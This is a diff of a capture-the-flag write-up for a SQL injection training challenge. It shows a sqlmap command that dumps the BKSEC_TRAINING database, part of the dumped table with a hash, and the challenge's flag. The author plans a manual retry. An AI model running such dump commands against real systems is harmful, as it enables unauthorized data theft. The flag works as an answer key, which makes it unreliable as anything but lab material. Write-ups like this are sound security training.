@@ -105,10 +105,6 @@ available databases [6]:
 
 **Dump the suspicious database:**
 ```bash
----
-cssclasses: code-nowrap
----
-
 sqlmap -r request.txt -D BKSEC_TRAINING --dump --batch
 
 Database: BKSEC_TRAINING                                                                                                                                                                                                                  
@@ -123,38 +119,17 @@ Table: user_info
 | 4  | 327a6c4304ad5938eaf0efb6cc3e53dc (flag)          | flag                     | flag                                                           |
 ```
 
+The flag can easily be obtained this way.
+
 ---
 
-## Privilege Escalation (Root)
-
-**Current User:** `www-data`
-
-### Enumeration
-
-- **LinPeas Findings:** `Vulnerable Sudo version`
-    
-
-### Exploitation
-
-Bash
-
-```
-# Commands to get root
-```
+## Try it again without SQLmap
+The SQLmap above is straight forward. However, it's kind of like "cheating" in my opinion so I'll try using a more... manual way this time.
 
 ---
 
 ## Loot & Flags
 
-- [ ] **User Flag:** `hash_here`
-    
-- [ ] **Root Flag:** `hash_here`
-    
-- [ ] **Credentials:**
-    
-    - `user:password`
-        
+**Flag:** BKSEC{c0nv3n13nc3_1nv3rs3_pr0p0rt10n4l_t0_s3cur1ty_huh_b7e4c1}
 
 ---
-
-**References:** [Link](https://www.google.com/search?q=url)
